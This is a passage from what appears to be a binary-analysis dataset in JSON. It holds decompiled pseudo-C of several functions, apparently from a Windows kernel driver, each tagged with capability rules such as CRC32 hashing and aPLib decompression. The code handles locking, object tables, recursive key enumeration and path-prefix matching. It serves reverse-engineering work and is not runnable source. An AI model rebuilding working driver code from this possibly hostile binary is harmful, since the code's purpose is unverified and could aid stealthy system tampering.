{\n                                                            uStack168 = puStack152[-1];\n                                                            puStack152[-1] = 0;\n                                                            in_RAX = puStack152;\n                                                        }\n                                                    }\n                                                }\n                                            }\n                                            else if (uVar7 < 0) {\n                                                in_RAX = NULL;\n                                                bVar4 = false;\n                                                bVar3 = true;\n                                            }\n                                            goto code_r0x000437d2;\n                                        }\n                                    }\n                                    else if (uVar2 == 6) {\n                                        if (0x13 < uVar13) {\n                                            uVar18 = *(puVar14 + 6) >> 2 & 0x3c;\n                                            if (in_stack_00000038 == 0) {\n                                                uStack192 = 0;\n                                                puStack200 = CONCAT44(*puStack128, *uStack184);\n                                                uStack191 = uVar2;\n                                                uStack190 = fcn.0002fd20(uVar10 & 0xffff);\n                                                in_RAX = fcn.0004296c(&puStack200, puVar14, uVar10);\n                                                if (in_RAX != 0) goto code_r0x00043933;\n                                            }\n                                            in_RAX = uVar18;\n                                            in_stack_00000030 = uVar13 - uVar18;\n                                            in_stack_00000028 = puVar14 + in_RAX;\n                                            if ((*(puVar14 + 0xd) & 0xef) != 0) goto code_r0x0004368f;\n                                        }\n                                    }\n                                    else {\n                                        puVar20 = puVar12;\n                                        if (uVar2 == 0x11) {\n                                            if (7 < uVar13) {\n                                                puStack144 = puVar14;\n                                                if (in_stack_00000038 == 0) {\n                                                    uStack174 = puVar14[2];\n                                                    uStack176 = 0;\n                                                    uStack184 = CONCAT44(*puStack128, *uStack184);\n                                                    uStack175 = uVar2;\n                                                    if (puVar14[3] == 0) {\n                                                        in_RAX = NULL;\n                                                    }\n                                                    else {\n                                                        uVar5 = fcn.0002fd20();\n                                                        in_RAX = fcn.00042af4(&uStack184, puVar14, uVar5);\n                                                    }\n                                                    if (in_RAX != 0) goto code_r0x00043933;\n                                                }\n                                                puVar15 = puVar14 + 4;\n                                                if (0x16 < uVar13 - 8) {\n                                                    in_RAX = fcn.0003f9b8(puVar15, 0x16);\n                                                    iVar6 = in_RAX;\n                                                    puVar14 = puVar12;\n                                                    if (iVar6 != 0) goto code_r0x000437db;\n                                                }\n                                                in_RAX = fcn.0002fd20();\n                                                if (in_RAX == 0x35) {\n                                                    in_RAX = fcn.00055a5c(puVar15, uVar13 - 8, &uStack184, auStack104);\n                                                    if (in_RAX != 0) {\n                                                        if (uStack160 == 0) {\n                                                            uStack160 = uStack184._4_1_ & 0x1f;\n                                                            bVar4 = false;\n                                                            bVar3 = true;\n                                                            uVar8 = uStack184._3_1_;\n                                                        }\n                                                        else {\n                                                            uVar10 = 0xffffffffffffffff;\n                                                            puVar16 = auStack104;\n                                                            do {\n                                                                if (uVar10 == 0) break;\n                                                                uVar10 = uVar10 - 1;\n                                                                cVar1 = *puVar16;\n                                                                puVar16 = puVar16 + 1;\n                                                            } while (cVar1 != '\\0');\n                                                            bVar4 = true;\n                                                            bVar3 = false;\n                                                            uStack160 = ~uVar10 - 1;\n                                                            uVar8 = 0;\n                                                        }\n                                                        in_RAX = auStack104;\n                                                        iVar6 = 8;\n                                                        puVar14 = puVar12;\n                                                        puStack136 = in_RAX;\n                                                        if (!bVar3) goto code_r0x000437db;\n                                                        if (in_stack_00000038 == 0) {\n                                                            uStack168 = *puVar15;\n                                                            *puVar15 = uVar8;\n                                                            puVar9 = puStack200;\n                                                            puVar20 = puVar19;\n                                                            iVar6 = 8;\n                                                            uVar7 = uVar8;\n                                                            goto code_r0x000437d2;\n                                                        }\n                                                        goto code_r0x0004392d;\n                                                    }\n                                                }\n                                                else {\ncode_r0x000437d2:\n                                                    uVar8 = uVar7;\n                                                    puVar14 = puVar20;\n                                                    if (iVar6 != 0) goto code_r0x000437db;\n                                                }\n                                            }\n                                        }\n                                        else if (0x16 < uVar13) {\n                                            in_RAX = fcn.0003f9b8(puVar14, 0x16);\n                                            iVar6 = in_RAX;\n                                            uVar7 = 0;\n                                            if (iVar6 != 0) goto code_r0x000437d2;\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n            else {\ncode_r0x0004368f:\n                if (0x16 < in_stack_00000030) {\n                    in_RAX = fcn.0003f9b8(in_stack_00000028, 0x16);\n                    iVar6 = in_RAX;\n                    puVar20 = puVar14;\n                    if (iVar6 == 0) goto code_r0x000437d2;\ncode_r0x000437db:\n                    puVar15 = puStack152;\n                    if (in_stack_00000038 == 0) {\n                        if (!bVar4) {\n                            if (puVar9 != NULL) {\n                                puVar9[1] = 0;\n                                puVar9[2] = 0;\n                                puVar9[3] = 0;\n                                *(puVar9 + 4) = 0;\n                                puVar9[5] = 0;\n                            }\n                            if (puVar14 != NULL) {\n                                *(puVar14 + 4) = 0;\n                                *(puVar14 + 2) = 0;\n                                puVar14[8] = 0;\n                                *(puVar14 + 6) = 0;\n                                *(puVar14 + 0xd) = 0;\n                                puVar14[7] = 0;\n                                puVar14[9] = 0;\n                            }\n                            if (puStack144 != NULL) {\n                                puStack144[3] = 0;\n                                puStack144[2] = 0;\n                            }\n                            if (((puStack112 != NULL) && (puStack112[1] = 0,  bVar3)) && (puStack152 != NULL)) {\n                                uVar8 = fcn.0002fcf4(uVar8 & 0x9fffffff);\n                                *puVar15 = uVar8;\n                            }\n                        }\n                        in_RAX = fcn.00042e54(arg1, arg2, arg3, arg4);\n                    }\n                    if (iVar6 != 0) {\ncode_r0x0004392d:\n                        if (!bVar4) goto code_r0x00043938;\n                    }\n                }\n            }\n        }\n    }\n    else {\n        puVar9 = arg3;\n        if (arg4 == 0xe) goto code_r0x000432ff;\n    }\ncode_r0x00043933:\n    puVar12 = 0x1;\ncode_r0x00043938:\n    return in_RAX & 0xffffffffffffff00 | puVar12;\n}\n",
        "token_count": 3345
    },
    "00018228": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nuint64_t fcn.00018228(void)\n\n{\n    int16_t iVar1;\n    uint32_t uVar2;\n    uint64_t uVar3;\n    int16_t *piVar4;\n    int16_t *piVar5;\n    int64_t iStackX8;\n    int64_t aiStackX16 [3];\n    ulong in_stack_fffffffffffffd08;\n    uint uVar6;\n    ulong in_stack_fffffffffffffd10;\n    uint uVar7;\n    uint16_t uStack744;\n    ushort uStack742;\n    int16_t *piStack736;\n    uint auStack728 [2];\n    ulong uStack720;\n    uint16_t *puStack712;\n    uint uStack704;\n    ulong uStack696;\n    ulong uStack688;\n    uchar auStack680 [16];\n    uchar auStack664 [94];\n    int16_t aiStack570 [269];\n    \n    uVar6 = in_stack_fffffffffffffd08 >> 0x20;\n    uVar7 = in_stack_fffffffffffffd10 >> 0x20;\n    iStackX8 = 0;\n    if (*0x78b04 != 0) {\n        return 0;\n    }\n    *0x78b04 = 1;\n    fcn.000619f0(&uStack744, 0x119f0);\n    puStack712 = &uStack744;\n    auStack728[0] = 0x30;\n    uStack720 = 0;\n    uStack704 = 0x240;\n    uStack696 = 0;\n    uStack688 = 0;\n    uVar3 = fcn.00061a50(&iStackX8, 1, auStack728);\n    if (uVar3 != 0) {\n        return uVar3;\n    }\n    piStack736 = aiStack570 + 1;\n    uStack744 = 0;\n    uStack742 = 0x206;\n    uVar2 = fcn.00061a4a(iStackX8, &uStack744, 0);\n    if (uVar2 == 0) {\n        for (piVar4 = aiStack570 + (uStack744 >> 1);\n            (((*piVar4 == 0x5c || (*piVar4 == 0x2f)) || (*piVar4 == 0x20)) || (*piVar4 == 9)); piVar4 = piVar4 + -1) {\n        }\n        piVar4[1] = 0;\n        piVar4 = fcn.00061a44(aiStack570 + 1);\n        uVar2 = 0xffffffff;\n        if (piVar4 != NULL) {\n            uVar3 = 0xffffffffffffffff;\n            piVar5 = piVar4;\n            do {\n                if (uVar3 == 0) break;\n                uVar3 = uVar3 - 1;\n                iVar1 = *piVar5;\n                piVar5 = piVar5 + 1;\n            } while (iVar1 != 0);\n            if (~uVar3 < 0x105) {\n                fcn.00061a3e(0x78850, piVar4 + 1, 0x104);\n                fcn.000289a0(auStack664, 0x52);\n                fcn.00061a0e(0x78a60, 0x52, 0x1195c, auStack664);\n                fcn.00061a0e(aiStack570 + 1, 0x104, 0x118b0, auStack664);\n                fcn.000619f0(&uStack744, aiStack570 + 1);\n                puStack712 = &uStack744;\n                auStack728[0] = 0x30;\n                uStack720 = 0;\n                uStack704 = 0x240;\n                uStack696 = 0;\n                uStack688 = 0;\n                uVar2 = fcn.00061a26(&iStackX8, 0x100000, auStack728, auStack680, CONCAT44(uVar6, 7), \n                                     CONCAT44(uVar7, 0x21));\n                if ((uVar2 != 0) || (uVar2 = (*_fcn.00011138)(iStackX8, 0, 0, 0, aiStackX16, 0),  uVar2 != 0))\n                goto code_r0x000184cb;\n                if (*(aiStackX16[0] + 0x10) == 0) {\n                    (*_fcn.000115b0)();\n                    goto code_r0x000184d0;\n                }\n                *0x78b10 = *(*(aiStackX16[0] + 0x10) + 0x10);\n                (*_fcn.000115a8)();\n                *0x78b08 = *(*(aiStackX16[0] + 0x10) + 8);\n                (*_fcn.000115a8)();\n                (*_fcn.000115b0)(aiStackX16[0]);\n                uVar2 = fcn.00016d54(*0x78b08, 0x18074, 0x17c9c);\n            }\n        }\n        if (uVar2 == 0) goto code_r0x000184d0;\n    }\ncode_r0x000184cb:\n    fcn.00017c28();\ncode_r0x000184d0:\n    if (iStackX8 != 0) {\n        fcn.000619de();\n    }\n    return uVar2;\n}\n",
        "token_count": 1232
    },
    "0001b294": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nuint64_t fcn.0001b294(uint64_t arg1)\n\n{\n    uint32_t uVar1;\n    uint64_t in_RAX;\n    uint64_t uVar2;\n    uint64_t *puVar3;\n    uint64_t uVar4;\n    uint64_t uVar5;\n    char in_DL;\n    int64_t iVar6;\n    uchar uVar7;\n    uint32_t uVar8;\n    uint64_t uVar9;\n    bool bVar10;\n    uint64_t auStackX8 [4];\n    \n    uVar5 = 0;\n    uVar7 = 0;\n    if (arg1 == 0) {\n        uVar2 = in_RAX & 0xffffffffffffff00;\n    }\n    else {\n        LOCK();\n        *0x79c70 = *0x79c70 + 1;\n        LOCK();\n        bVar10 = *0x79c68 == 0;\n        *0x79c68 = *0x79c68 ^ bVar10 * *0x79c68;\n        uVar4 = !bVar10 * *0x79c68;\n        uVar2 = uVar5;\n        if (!bVar10) {\n            uVar1 = fcn.00049dc4();\n            uVar2 = 0;\n            if (in_DL != '\\0') {\n                fcn.0002f23c(0x799d0);\n                puVar3 = 0x799e8;\n                uVar4 = uVar5;\n                do {\n                    uVar8 = uVar4;\n                    if ((puVar3[-1] == arg1) && ((*puVar3 == uVar1 || (arg1 < 0)))) {\n                        *(uVar8 * 0x10 + 0x799e0) = 0;\n                        *(uVar8 * 0x10 + 0x799e8) = 0;\n                        break;\n                    }\n                    puVar3 = puVar3 + 2;\n                    uVar8 = uVar8 + 1;\n                    uVar4 = uVar8;\n                } while (puVar3 < 0x79ae8);\n                fcn.0002f2a4(0x799d0);\n                if (uVar8 < 0x10) {\n                    uVar2 = 1;\n                }\n            }\n            if ((((arg1 & 0xffffffff80000000) != 0xffffffff80000000) || (arg1 == 0xfffffffffffffffe)) ||\n               (arg1 == 0xffffffffffffffff)) {\n                uVar7 = 1;\n            }\n            uVar4 = (*_fcn.00011138)(arg1, 0, 0, uVar7, auStackX8, 0);\n            if (uVar4 == 0) {\n                uVar9 = ((auStackX8[0] >> 8 ^ auStackX8[0]) >> 8 ^ auStackX8[0]) >> 8 ^ auStackX8[0];\n                iVar6 = SUB168(ZEXT816(0x47ae147ae147ae15) * ZEXT816(uVar9) >> 0x40, 0);\n                uVar4 = (*_fcn.000115b0)();\n                uVar9 = uVar9 + ((uVar9 - iVar6 >> 1) + iVar6 >> 6) * -100;\n            }\n            else {\n                auStackX8[0] = 0;\n                uVar9 = uVar5;\n            }\n            if (auStackX8[0] != 0) {\n                fcn.0002f23c(0x79b88);\n                if (((in_DL == '\\0') || (*(auStackX8[0] - 0x28) == 1)) && (iVar6 = *(*0x799d8 + uVar9 * 8),  iVar6 != 0)\n                   ) {\n                    puVar3 = iVar6 + 8;\n                    uVar4 = uVar5;\n                    do {\n                        if (*puVar3 == auStackX8[0]) {\n                            iVar6 = uVar4 * 0x30 + iVar6;\n                            fcn.0002fc50(*(iVar6 + 0x20));\n                            fcn.00061a56(iVar6, 0, 0x30);\n                            break;\n                        }\n                        uVar5 = uVar5 + 1;\n                        uVar4 = uVar4 + 1;\n                        puVar3 = puVar3 + 6;\n                    } while (uVar5 < 100);\n                }\n                uVar4 = fcn.0002f2a4(0x79b88);\n            }\n        }\n        LOCK();\n        *0x79c70 = *0x79c70 + -1;\n        uVar2 = uVar4 & 0xffffffffffffff00 | uVar2;\n    }\n    return uVar2;\n}\n",
        "token_count": 1076
    },
    "0001b54c": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nuint64_t fcn.0001b54c(uint64_t arg1, ulong arg2, ulong arg3, uint64_t arg4)\n\n{\n    int64_t iVar1;\n    uint8_t uVar2;\n    uint64_t uVar3;\n    uint64_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int64_t iVar7;\n    uint64_t uVar8;\n    int64_t *piVar9;\n    int64_t iVar10;\n    uint64_t uVar11;\n    bool bVar12;\n    uint64_t auStack72 [2];\n    \n    iVar1 = *0xfffff78000000014;\n    LOCK();\n    *0x79c70 = *0x79c70 + 1;\n    uVar4 = 0;\n    LOCK();\n    bVar12 = *0x79c68 == 0;\n    *0x79c68 = *0x79c68 ^ bVar12 * *0x79c68;\n    uVar3 = !bVar12 * *0x79c68;\n    if (!bVar12) {\n        if ((((arg1 & 0xffffffff80000000) != 0xffffffff80000000) || (arg1 == 0xfffffffffffffffe)) ||\n           (uVar2 = 0,  arg1 == 0xffffffffffffffff)) {\n            uVar2 = 1;\n        }\n        uVar3 = (*_fcn.00011138)(arg1, 0, 0, arg4 & 0xffffffffffffff00 | uVar2, auStack72, 0);\n        if (uVar3 == 0) {\n            uVar8 = ((auStack72[0] >> 8 ^ auStack72[0]) >> 8 ^ auStack72[0]) >> 8 ^ auStack72[0];\n            iVar7 = SUB168(ZEXT816(0x47ae147ae147ae15) * ZEXT816(uVar8) >> 0x40, 0);\n            uVar3 = (*_fcn.000115b0)();\n            uVar8 = uVar8 + ((uVar8 - iVar7 >> 1) + iVar7 >> 6) * -100;\n        }\n        else {\n            auStack72[0] = 0;\n            uVar8 = uVar4;\n        }\n        if (auStack72[0] != 0) {\n            fcn.0002f23c(0x79b88);\n            piVar9 = *0x799d8 + uVar8 * 8;\n            if (*piVar9 == 0) {\n                iVar7 = fcn.0002fc18(100);\n                piVar9 = *0x799d8 + uVar8 * 8;\n                *piVar9 = iVar7;\n                if (iVar7 != 0) goto code_r0x0001b67d;\n            }\n            else {\ncode_r0x0001b67d:\n                iVar7 = *piVar9;\n                piVar9 = iVar7 + 0x10;\n                uVar3 = uVar4;\n                uVar8 = uVar4;\n                do {\n                    iVar6 = uVar8;\n                    if (piVar9[-1] == 0) {\n                        iVar5 = uVar3;\n                        if (iVar6 != -1) {\n                            iVar5 = iVar6;\n                        }\n                        break;\n                    }\n                    uVar11 = iVar1 - *piVar9;\n                    if (uVar4 < uVar11) {\n                        uVar4 = uVar11;\n                        uVar3 = uVar8;\n                    }\n                    iVar5 = uVar3;\n                    uVar8 = iVar6 + 1U;\n                    piVar9 = piVar9 + 6;\n                } while (iVar6 + 1U < 100);\n                iVar10 = iVar5 * 0x30;\n                fcn.0002fc50(*(iVar10 + 0x20 + iVar7));\n                *(iVar10 + 0x20 + iVar7) = arg2;\n                *(iVar10 + 8 + iVar7) = auStack72[0];\n                *(iVar10 + 0x18 + iVar7) = arg3;\n                *(iVar10 + 0x28 + iVar7) = arg4;\n                *(iVar10 + 0x10 + iVar7) = iVar1;\n                uVar4 = 1;\n            }\n            uVar3 = fcn.0002f2a4(0x79b88);\n            LOCK();\n            uVar3 = uVar3 & 0xffffffffffffff00 | uVar4;\n            goto code_r0x0001b703;\n        }\n    }\n    LOCK();\n    uVar3 = uVar3 & 0xffffffffffffff00;\ncode_r0x0001b703:\n    *0x79c70 = *0x79c70 + -1;\n    return uVar3;\n}\n",
        "token_count": 1074
    },
    "0001b714": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nuint64_t fcn.0001b714(uint64_t arg1, uint64_t arg2, uint32_t *arg3)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    uint8_t uVar3;\n    int32_t iVar4;\n    uint64_t uVar5;\n    int64_t iVar6;\n    uint64_t *puVar7;\n    uint64_t uVar8;\n    uint64_t uVar9;\n    uint64_t uVar10;\n    uint64_t in_R9;\n    uint32_t uVar11;\n    uint64_t uVar12;\n    bool bVar13;\n    uchar auStackX32 [8];\n    uint64_t uStack104;\n    ulong uStack96;\n    uint64_t uStack88;\n    \n    iVar2 = *0xfffff78000000014;\n    uVar9 = 0;\n    LOCK();\n    *0x79c70 = *0x79c70 + 1;\n    LOCK();\n    bVar13 = *0x79c68 == 0;\n    *0x79c68 = *0x79c68 ^ bVar13 * *0x79c68;\n    uVar5 = !bVar13 * *0x79c68;\n    uVar10 = uVar9;\n    if (!bVar13) {\n        uStack88 = arg1 & 0xffffffff80000000;\n        uVar10 = 0;\n        uVar12 = uVar9;\n        while( true ) {\n            if (((uStack88 != 0xffffffff80000000) || (arg1 == 0xfffffffffffffffe)) ||\n               (uVar3 = 0,  arg1 == 0xffffffffffffffff)) {\n                uVar3 = 1;\n            }\n            in_R9 = in_R9 & 0xffffffffffffff00 | uVar3;\n            uVar5 = (*_fcn.00011138)(arg1, 0, 0, in_R9, &uStack104, 0);\n            if (uVar5 == 0) {\n                uVar8 = ((uStack104 >> 8 ^ uStack104) >> 8 ^ uStack104) >> 8 ^ uStack104;\n                iVar6 = SUB168(ZEXT816(0x47ae147ae147ae15) * ZEXT816(uVar8) >> 0x40, 0);\n                uVar5 = (*_fcn.000115b0)();\n                uVar8 = uVar8 + ((uVar8 - iVar6 >> 1) + iVar6 >> 6) * -100;\n            }\n            else {\n                uStack104 = 0;\n                uVar8 = uVar9;\n            }\n            if (uStack104 == 0) break;\n            fcn.0002f23c(0x79b88);\n            iVar6 = *(*0x799d8 + uVar8 * 8);\n            if (iVar6 != 0) {\n                puVar7 = iVar6 + 8;\n                uVar5 = uVar9;\n                do {\n                    if (*puVar7 == uStack104) {\n                        if (iVar2 - *(iVar6 + 0x10 + uVar5 * 0x30) < 100000000) {\n                            if (arg3 != NULL) {\n                                iVar1 = *(iVar6 + 0x20 + uVar5 * 0x30);\n                                uVar11 = arg2 & 0xffffffff;\n                                if (iVar1 == 0) {\n                                    *arg3 = uVar11;\n                                }\n                                else if (uVar11 < *(iVar6 + 0x18 + uVar5 * 0x30)) {\n                                    *arg3 = *(iVar1 + (arg2 & 0xffffffff) * 4);\n                                }\n                                else {\n                                    *arg3 = *(iVar6 + 0x28 + uVar5 * 0x30);\n                                }\n                            }\n                            uVar10 = 1;\n                        }\n                        else {\n                            fcn.0002f2a4(0x79b88);\n                            fcn.0001b294(arg1);\n                            fcn.0002f23c(0x79b88);\n                        }\n                        break;\n                    }\n                    uVar5 = uVar5 + 1;\n                    puVar7 = puVar7 + 6;\n                } while (uVar5 < 100);\n            }\n            uVar5 = fcn.0002f2a4(0x79b88);\n            if (((uVar10 != '\\0') || (0 < uVar12)) || (uVar5 = fcn.0002fbc4(0x402),  uVar5 == 0)) break;\n            iVar4 = fcn.0002f51c(arg1, &uStack96);\n            if (iVar4 == 0) {\n                in_R9 = 0x400;\n                fcn.00061ab6(uStack96, 2, uVar5, 0x400, auStackX32);\n                fcn.0002f57c(arg1, uStack96);\n            }\n            fcn.0002fc50(uVar5);\n            uVar12 = uVar12 + 1;\n        }\n    }\n    LOCK();\n    *0x79c70 = *0x79c70 + -1;\n    return uVar5 & 0xffffffffffffff00 | uVar10;\n}\n",
        "token_count": 1174
    },
    "0001ba1c": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nuint64_t fcn.0001ba1c(ulong arg1, int16_t *arg2, int64_t arg3, int64_t arg4)\n\n{\n    int16_t iVar1;\n    char cVar2;\n    int32_t iVar3;\n    int64_t iVar4;\n    code *pcVar5;\n    int64_t iVar6;\n    uint64_t uVar7;\n    uint64_t uVar8;\n    int32_t iVar9;\n    int16_t *piVar10;\n    bool bVar11;\n    uchar auStack136 [8];\n    ulong uStack128;\n    int64_t iStack120;\n    uchar auStack112 [16];\n    uint uStack96;\n    ulong uStack88;\n    uchar *puStack80;\n    uint uStack72;\n    ulong uStack64;\n    ulong uStack56;\n    \n    iVar4 = *0x79c70;\n    uVar8 = 0;\n    LOCK();\n    *0x79c70 = *0x79c70 + 1;\n    LOCK();\n    bVar11 = *0x79c68 == 0;\n    *0x79c68 = *0x79c68 ^ bVar11 * *0x79c68;\n    uVar7 = !bVar11 * *0x79c68;\n    if (bVar11) {\n        LOCK();\n        uVar7 = uVar7 & 0xffffffffffffff00;\n        *0x79c70 = iVar4;\n    }\n    else {\n        if (arg3 < arg4) {\n            iVar4 = fcn.0002fbc4(0x402);\n            if (iVar4 != 0) {\n                pcVar5 = fcn.0005164c(*0x79c50);\n                while( true ) {\n                    iVar9 = uVar8;\n                    iVar3 = (*pcVar5)(arg1, uVar8, 0, iVar4, 0x400, auStack136);\n                    if (iVar3 == -0x7fffffe6) break;\n                    if (iVar3 == 0) {\n                        *(iVar4 + 0x10 + (*(iVar4 + 0xc) >> 1) * 2) = 0;\n                    }\n                    else {\n                        if (iVar3 != -0x7ffffffb) break;\n                        *(iVar4 + 0x400) = 0;\n                    }\n                    if (arg3 + 1 <= arg4) {\n                        uVar7 = 0xffffffffffffffff;\n                        piVar10 = iVar4 + 0x10;\n                        do {\n                            if (uVar7 == 0) break;\n                            uVar7 = uVar7 - 1;\n                            iVar1 = *piVar10;\n                            piVar10 = piVar10 + 1;\n                        } while (iVar1 != 0);\n                        uVar8 = 0xffffffffffffffff;\n                        piVar10 = arg2;\n                        do {\n                            if (uVar8 == 0) break;\n                            uVar8 = uVar8 - 1;\n                            iVar1 = *piVar10;\n                            piVar10 = piVar10 + 1;\n                        } while (iVar1 != 0);\n                        iVar6 = fcn.0002fbc4(((~uVar7 - 2) + ~uVar8) * 2 + 4);\n                        iStack120 = iVar6;\n                        if (iVar6 != 0) {\n                            fcn.00061a62(iVar6, 0x11ac0, arg2, iVar4 + 0x10);\n                            fcn.000619f0(auStack112, iVar6);\n                            puStack80 = auStack112;\n                            uStack96 = 0x30;\n                            uStack88 = 0;\n                            uStack72 = 0x140;\n                            uStack64 = 0;\n                            uStack56 = 0;\n                            iVar3 = fcn.000619ea(&uStack128);\n                            if (iVar3 == 0) {\n                                cVar2 = fcn.0001ba1c(uStack128, iStack120, arg3 + 1, arg4);\n                                if (cVar2 != '\\0') {\n                                    iVar9 = iVar9 + -1;\n                                }\n                                fcn.000619de(uStack128);\n                            }\n                            fcn.0002fc50(iStack120);\n                        }\n                    }\n                    uVar8 = iVar9 + 1;\n                    pcVar5 = fcn.0005164c(*0x79c50);\n                }\n                fcn.0002fc50(iVar4);\n            }\n            iVar3 = fcn.00061a14(arg1);\n            uVar7 = 0;\n            uVar8 = iVar3 == 0;\n        }\n        LOCK();\n        *0x79c70 = *0x79c70 + -1;\n        uVar7 = uVar7 & 0xffffffffffffff00 | uVar8;\n    }\n    return uVar7;\n}\n",
        "token_count": 1078
    },
    "0002da20": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nuint64_t fcn.0002da20(int32_t *arg1, ulong noname_1, ulong *arg3, uint *arg4)\n\n{\n    uint32_t uVar1;\n    int16_t iVar2;\n    uint16_t uVar3;\n    ulong uVar4;\n    ulong uVar5;\n    uint uVar6;\n    uint uVar7;\n    uint uVar8;\n    uint *puVar9;\n    ulong *puVar10;\n    uint64_t uVar11;\n    uint64_t uVar12;\n    int64_t iVar13;\n    uint16_t uVar14;\n    uint8_t uVar15;\n    int16_t *piVar16;\n    uint64_t uVar17;\n    int16_t *piVar18;\n    uint64_t uVar19;\n    \n    if (*0x7a620 == NULL) {\n        *0x7a620 = fcn.0002fbc4(0xa28);\n        if (*0x7a620 == NULL) {\n            return 0;\n        }\n        *0x7a590 = *0x7a620 + 0x104;\n        *0x7a578 = *0x7a620 + 0x208;\n        *0x7a550 = *0x7a620 + 0x30c;\n        piVar16 = *0x7a620 + 0x410;\n        *0x7a568 = *0x7a620;\n        fcn.00028540(*0x7a620, 0x104);\n        fcn.00028598(*0x7a590, 0x104);\n        fcn.00028438(piVar16, 0x104);\n        fcn.00061a62(*0x7a578, 0x1195c, piVar16);\n        fcn.00028490(piVar16, 0x104);\n        fcn.00061a62(*0x7a550, 0x1195c, piVar16);\n        uVar12 = 0xffffffffffffffff;\n        uVar11 = uVar12;\n        piVar16 = *0x7a568;\n        do {\n            if (uVar11 == 0) break;\n            uVar11 = uVar11 - 1;\n            iVar2 = *piVar16;\n            piVar16 = piVar16 + 1;\n        } while (iVar2 != 0);\n        *0x7a558 = (~uVar11 - 1) * 2;\n        uVar11 = uVar12;\n        piVar16 = *0x7a590;\n        do {\n            if (uVar11 == 0) break;\n            uVar11 = uVar11 - 1;\n            iVar2 = *piVar16;\n            piVar16 = piVar16 + 1;\n        } while (iVar2 != 0);\n        *0x7a560 = (~uVar11 - 1) * 2;\n        uVar11 = uVar12;\n        piVar16 = *0x7a578;\n        do {\n            if (uVar11 == 0) break;\n            uVar11 = uVar11 - 1;\n            iVar2 = *piVar16;\n            piVar16 = piVar16 + 1;\n        } while (iVar2 != 0);\n        *0x7a580 = (~uVar11 - 1) * 2;\n        piVar16 = *0x7a550;\n        do {\n            if (uVar12 == 0) break;\n            uVar12 = uVar12 - 1;\n            iVar2 = *piVar16;\n            piVar16 = piVar16 + 1;\n        } while (iVar2 != 0);\n        *0x7a570 = (~uVar12 - 1) * 2;\n    }\n    uVar11 = *0x7a560;\n    uVar12 = *0x7a558;\n    *arg4 = 0;\n    if (arg1 == NULL) {\n        return arg4 & 0xffffffffffffff00;\n    }\n    puVar9 = arg4;\n    if (noname_1 != '\\0') {\n        puVar9 = (**0x11568)(arg1, 0x30, 4);\n        uVar12 = *0x7a558;\n        uVar11 = *0x7a560;\n    }\n    if ((*arg1 != 0x30) || ((arg1[6] & 0xfffff80dU) != 0)) {\n        return puVar9 & 0xffffffffffffff00;\n    }\n    puVar10 = *(arg1 + 4);\n    if (puVar10 == NULL) {\n        return 0;\n    }\n    if (noname_1 == '\\0') {\n        uVar6 = *(puVar10 + 4);\n        uVar7 = *(puVar10 + 1);\n        uVar8 = *(puVar10 + 0xc);\n        *arg3 = *puVar10;\n        *(arg3 + 4) = uVar6;\n        *(arg3 + 1) = uVar7;\n        *(arg3 + 0xc) = uVar8;\n    }\n    else {\n        if (**0x11330 <= puVar10) {\n            puVar10 = **0x11330;\n        }\n        uVar4 = *puVar10;\n        uVar5 = puVar10[1];\n        *arg3 = uVar4;\n        arg3[1] = uVar5;\n        puVar10 = (**0x11568)(uVar4, arg3[1], *arg3, 2);\n        uVar12 = *0x7a558;\n        uVar11 = *0x7a560;\n    }\n    uVar15 = 0;\n    piVar16 = NULL;\n    uVar19 = 0;\n    if (((*arg3 & 1) != 0) || (*arg3 == 0xfffe)) {\n        return puVar10 & 0xffffffffffffff00;\n    }\n    uVar17 = *arg3;\n    if (((uVar17 == uVar12) ||\n        ((uVar12 < uVar17 && (puVar10 = arg3[1],  *(puVar10 + (uVar12 & 0xfffffffffffffffe)) == 0x5c)))) &&\n       (puVar10 = fcn.00030254(arg3[1], *0x7a568, uVar12 >> 1),  uVar11 = *0x7a560,  puVar10 == 0)) {\n        uVar15 = 1;\n        uVar19 = *0x7a558;\n        piVar16 = *0x7a568;\n    }\n    else if (((uVar17 == uVar11) ||\n             ((uVar11 < uVar17 && (puVar10 = arg3[1],  *(puVar10 + (uVar11 & 0xfffffffffffffffe)) == 0x5c)))) &&\n            (puVar10 = fcn.00030254(arg3[1], *0x7a590, uVar11 >> 1),  puVar10 == 0)) {\n        uVar15 = 1;\n        uVar19 = *0x7a560;\n        piVar16 = *0x7a590;\n    }\n    else if (((uVar17 == *0x7a580) ||\n             ((*0x7a580 < uVar17 && (puVar10 = arg3[1],  *(puVar10 + (*0x7a580 & 0xfffffffffffffffe)) == 0x5c)))) &&\n            (puVar10 = fcn.00030254(arg3[1], *0x7a578, *0x7a580 >> 1),  puVar10 == 0)) {\n        uVar15 = 1;\n        uVar19 = *0x7a580;\n        piVar16 = *0x7a568;\n    }\n    else {\n        if (((uVar17 == *0x7a570) ||\n            ((*0x7a570 < uVar17 && (puVar10 = arg3[1],  *(puVar10 + (*0x7a570 & 0xfffffffffffffffe)) == 0x5c)))) &&\n           (puVar10 = fcn.00030254(arg3[1], *0x7a550, *0x7a570 >> 1),  puVar10 == 0)) {\n            uVar15 = 1;\n            uVar19 = *0x7a570;\n            piVar16 = *0x7a590;\n        }\n        if (uVar15 == 0) goto code_r0x0002de5f;\n    }\n    iVar13 = -1;\n    piVar18 = piVar16;\n    do {\n        if (iVar13 == 0) break;\n        iVar13 = iVar13 + -1;\n        iVar2 = *piVar18;\n        piVar18 